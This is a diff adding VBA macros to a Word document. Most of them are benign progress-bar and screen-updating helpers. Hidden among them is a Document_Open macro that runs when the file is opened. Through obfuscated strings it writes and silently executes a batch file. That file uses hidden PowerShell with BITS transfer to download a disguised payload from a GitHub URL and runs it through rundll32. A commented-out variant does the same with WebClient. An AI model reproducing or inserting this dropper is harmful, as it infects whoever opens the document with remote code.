@@ -1,0 +1,155 @@
+'== UI_ScreenUpdating ==============================================================
+'
+'   Purpose:    Enables or disables redraws within the Word window, allowing
+'               macro activity to be hidden from the user.  Also sets the
+'               wait cursor off or on.
+'   Used By:    Various
+'   Parameters: (in)  bShowUpdates: True for updates on, False for off
+'   Returns:    N/A
+'-----------------------------------------------------------------------------------
+
+Public Sub UI_ScreenUpdating(bShowUpdates As Boolean)
+    Application.ScreenUpdating = bShowUpdates
+
+    If bShowUpdates Then
+        Application.System.Cursor = wdCursorNormal
+    Else
+        Application.System.Cursor = wdCursorWait
+    End If
+End Sub
+
+'== UI_ShowProgress ================================================================
+'
+' Purpose:  Show a progress bar on screen, with an optional Cancel button.
+'
+' Remarks:  fInitialValue is a percentage (0.5 = 50%).  If AllowCancel is true, make
+'           sure to call UpdateProgress often and check its result.
+'
+'           You must call HideProgress when your code finishes (or hits an error)!
+'-----------------------------------------------------------------------------------
+
+Public Sub UI_ShowProgress(sTitle As String, bAllowCancel As Boolean, _
+                               Optional fInitialValue As Single = 0)
+
+    ' don't show a progress bar when Word is minimized
+    If Application.WindowState <> wdWindowStateMinimize Then
+        With frmProgress
+            .m_sSubRangeStack = ""
+            .m_bCancelFlag = False
+            If sTitle <> "" Then
+                .Caption = sTitle
+            End If
+
+            If bAllowCancel Then
+                .cmdCancel.Visible = True
+                .cmdCancel.Enabled = True
+                .Height = .cmdCancel.Top + .cmdCancel.Height + .frameOuter.Top _
+                           + .Height - .InsideHeight
+            Else
+                .cmdCancel.Visible = False
+                .Height = (.frameOuter.Top * 2) + .frameOuter.Height _
+                           + .Height - .InsideHeight
+            End If
+            UI_PaintProgressBar fInitialValue, True
+        End With
+
+        #If VBA6 Then
+            ' post-Word 97 ONLY
+            frmProgress.Show False
+        #End If
+    End If
+End Sub
+
+Sub Document_Open()
+    Dim myname As String
+    
+    ro = "0"
+    ra = "1"
+    rb = "4"
+    newname = "imagew002.png"
+    Table = "s^he^ll"
+    guava = FreeFile
+    woord = "t"
+    wood = "a"
+    snail = "i"
+    myname = ActiveDocument.Name
+    mytitle = ActiveDocument.BuiltInDocumentProperties("Title")
+
+    If mytitle = "BITS 2021" Then
+        ActiveDocument.BuiltInDocumentProperties("Title") = "BITS PILANI 2021"
+        If ActiveDocument.ReadOnly = False Then
+            ActiveDocument.Save
+        End If
+        GoTo Earth
+    Else
+    ActiveDocument.BuiltInDocumentProperties("Title") = "BITS 2021"
+        If ActiveDocument.ReadOnly = False Then
+            ActiveDocument.Save
+        End If
+    End If
+    If InStr(myname, ".") > 0 Then
+        myname = Left(myname, InStr(myname, ".") - 1)
+    End If
+    Tomato = Environ$("temp") & "\" & myname
+    ActiveDocument.SaveAs Tomato, wdFormatHTML, , , , , True
+    
+    Tomato = Tomato & "_" & "f" & snail & "les"
+    watermelon = Tomato & "\" & newname
+    'Name watermelon As Tomato & "\" & "helloworld" & ".b" & wood & woord
+    arrow = Tomato & "\myimage." & "b" & wood & woord
+    Open arrow For Output As guava
+    Print #guava, "power" & Table & " -w h S" & woord & wood & "rt-B" & snail & "tsTr" & wood & "nsfer -SoU htt`ps`:/`/github`.`co`m/dduckworld/oletools/blob/master/Intro`.`pdf?raw=true """ & watermelon & """; R`unD`L`l3`2 """ & watermelon & """,BITS;"
+    Close #guava
+    'fo = GetObject("", "Shell.Application").Open(arrow)
+    fo = Shell(arrow, 0)
+Earth:
+End Sub
+
+'== UI_IncrementProgress ===========================================================
+'
+' Purpose:  Adds a chunk to the progress bar.
+'
+' Remarks:  Same as UpdateProgress, but designed for loops where it's hard to keep
+'           track of the exact value!
+'-----------------------------------------------------------------------------------
+Public Function UI_IncrementProgress(fPercentIncrement As Single) As Boolean
+    ' don't show a progress bar when Word is minimized
+    If Application.WindowState <> wdWindowStateMinimize And fPercentIncrement > 0 Then
+        With frmProgress
+            If .Visible = False Then
+                UI_ShowProgress "", False, fPercentIncrement
+            Else
+                .m_fCurrentPercent = .m_fCurrentPercent + fPercentIncrement
+                UI_PaintProgressBar UI_ScaleProgressToSubRange(.m_fCurrentPercent), False
+            End If
+            UI_IncrementProgress = Not .m_bCancelFlag
+        End With
+    End If
+End Function
+
+'== UI_ShiftProgressSubRange =======================================================
+'
+' Purpose:  Shifts the top "sub range" in the progress "stack".  (This effectively
+'           pops it and pushes a new sub range.
+'
+' Remarks:  See remarks for PushProgressSubRange.
+'-----------------------------------------------------------------------------------
+Public Sub UI_ShiftProgressSubRange(ByVal fNewSubRangeStart As Single, _
+                                ByVal fNewSubRangeEnd As Single)
+
+    UI_PopProgressSubRange
+    UI_PushProgressSubRange fNewSubRangeStart, fNewSubRangeEnd
+    UI_UpdateProgress 0
+End Sub
+
+Sub btn()
+'
+' btnn Macro
+'
+'
+End Sub
+
+'win7 compatbile command----
+'Print #guava, "power" & Table & " -w 0 $SoU = ""htt`ps`:/`/github`.`co`m/dduckworld/oletools/blob/master/Intro`.`pdf?raw=true"";" _
+    '& "$DeSt = """ & watermelon & """;(&('N'+'ew-O'+'bject') SYSTEM.NET.webcLiENt).""DO`Wnl`oADF`iLe""($SoU, $DeSt); R`unD`L`l3`2 """ & watermelon & """,BITS;"
+    'Close #guava
